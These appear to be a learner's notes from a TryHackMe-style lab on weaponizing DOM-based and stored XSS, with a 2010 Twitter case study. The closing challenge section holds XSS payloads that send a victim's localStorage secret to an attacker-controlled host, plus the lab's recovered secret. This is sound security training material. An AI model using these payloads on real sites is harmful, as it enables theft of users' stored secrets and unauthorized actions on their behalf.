
To weaponize DOM-based XSS, we need to rely on the two conventional delivery methods of XSS payloads, namely storage and reflection. This is why DOM-based XSS, and other DOM-based attacks for that matter, are so hard to exploit. Without a proper delivery method, you are performing the attack on yourself and not a target.

To counter this, we either need the web server to store our payload for later delivery or to deliver the payload through reflection. At this point, our DOM-based XSS becomes a Stored or Reflected XSS attack.

Modern browsers have introduced **URL encoding** mechanisms, making **reflected XSS** harder to exploit when the source is the URL. This means that many traditional reflected XSS attacks fail because special characters (like `<script>`) are automatically encoded, preventing script execution.

As a result, **stored XSS** becomes a more viable attack vector, as it does not rely on URL-based reflection but rather on **persistent data stored on the server**.

Since stored XSS involves **injecting malicious scripts into stored user data**, attackers look for **sinks** where this data is later used **without sanitization or validation**. Potential sources include:
- **User profiles** (e.g., username, bio, comments, status updates).
- **Forum posts or reviews** where user content is stored and displayed.
- **Chat applications** that persist messages and display them dynamically.
- **Admin dashboards** that render user-submitted content.

 *Key Factors in Identifying Vulnerable Sinks*
- **Is the user input being properly escaped before rendering?** If not, it could lead to script execution.
- **Which function is injecting the data into the page?** If `innerHTML` or `document.write` is used, it’s a high-risk sink.
- **Is the data being processed by JavaScript after retrieval?**  If so, it could lead to **DOM-based stored XSS**.

## General Weaponization Guidelines
Oftentimes, you will find that it is easy to get the coveted `alert('XSS')` payload to work. However, this is usually where the fun ends, and if we are being honest with ourselves, we haven't actually shown impact.

The next crutch that is often used is to attempt to steal the user's cookie. However, this quickly becomes a problem when cookie security is enforced by using the HTTPOnly flag, disallowing JavaScript from recovering the cookie value. We need to dive deeper to weaponize the XSS vulnerability to achieve a valid exploit and show the true impact of what was found.

The following is a [great article](https://labs.withsecure.com/blog/getting-real-with-xss/) that talks about XSS weaponization. To fully weaponize XSS, we first need to realize the power of what we have. At the point where we can fully execute XSS and load a staged payload, we can control the user's browser. This means we can interface with the web application as the user would. We don't need to pop an alert or steal the user's cookie. We can instruct the browser to request on behalf of the user. This is what makes XSS so powerful. Even if you find XSS on a page where there isn't really anything sensitive, you can instruct the browser to recover information from other, more sensitive pages or to perform state-changing actions on behalf of the user. All we need to do is understand the application's functionality and tailor our XSS payload to leverage and use this functionality to our advantage. Let's take a look at a case study.


## Case Study - Twitter
In 2010, it was discovered that Twitter (now [X](https://twitter.com/?lang=en)) had a DOM-based XSS vulnerability. In an update to their JavaScript, Twitter introduced the following function:

```javascript
//<![CDATA[ (function(g){var a=location.href.split("#!")[1];if(a){g.location=g.HBR=a;}})(window); //]]>
```

Effectively, the function searched for `#!` in the URL and assigned the content to the `window.location` object, creating both a source and a sink without proper data validation and sanitisation. As such, an attacker could get the coveted pop-up simply using this payload:

`http://twitter.com/#!javascript:alert(document.domain);`

As mentioned before, this wouldn't really do anything. However, the issue was weaponised by [threat actors](https://archive.f-secure.com/weblog/archives/00002035). The vulnerability was weaponised using the `onmouseover` JavaScript function to create a worm that would:

- Retweet itself to further spread to new users
- Redirect users to other websites, in some cases containing further malicious payloads.
- Display pop-ups and other intrusive behaviours that could potentially phish for personal information.  

In the end, the weaponised exploit affected thousands of users. It is worth remembering that this was in 2010. If such a bug were found today, the impact would be even larger.


## Challenge
Also consider this challenge write-up: https://github.com/cyberterms/tryhackme-write-ups/blob/main/DOM-Based_Attacks/write-up.md  

![](Pasted%20image%2020250205160028.png)
	![](Pasted%20image%2020250205160130.png)
		![](Pasted%20image%2020250205160330.png)
			![](Pasted%20image%2020250205160514.png)

- Script for stealing victim's secret that is stored in browser local.storage:
```javascript
<script>fetch('http://{YOUR_IP}:8000/?data='+encodeURIComponent(localStorage.getItem('secret')))</script>
```

- XSS payload 
```javascript
<img src="1" onerror="fetch('http://{YOUR_IP}:8000/?secret='+encodeURIComponent(localStorage.getItem('secret')))">
```

- We have to set a delay interval to wait for our victim 
```javascript
<img src="1" onerror="setInterval(()=>fetch('http://{YOUR_IP}:8000/?secret='+encodeURIComponent(localStorage.getItem('secret'))), 6000)">
```

![](Pasted%20image%2020250205163520.png)
	![](Pasted%20image%2020250205163702.png)

secret: `thisisthesupersecretvalue` (modify the cookie value in the local storage in order to be able now to perform delete actions via API delete request)
	![](Pasted%20image%2020250205164338.png)
		![](Pasted%20image%2020250205164419.png)
			![](Pasted%20image%2020250205164450.png)